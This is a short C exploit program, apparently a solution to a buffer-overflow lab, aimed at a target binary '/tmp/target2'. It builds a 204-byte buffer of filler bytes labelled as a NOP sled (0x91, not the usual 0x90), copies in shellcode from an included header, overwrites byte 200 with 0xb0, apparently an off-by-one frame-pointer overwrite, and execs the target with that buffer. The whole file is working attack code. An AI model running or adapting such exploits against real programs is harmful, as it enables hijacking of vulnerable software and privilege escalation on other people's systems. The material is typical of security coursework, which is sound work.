#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack_buffer[204];
  memset(attack_buffer, 0x91, 203);  // Fill with NOPs
  memcpy(attack_buffer, shellcode, strlen(shellcode));  // Copy the payload in

  attack_buffer[200] = 0xb0;

  args[0] = TARGET; args[1] = attack_buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
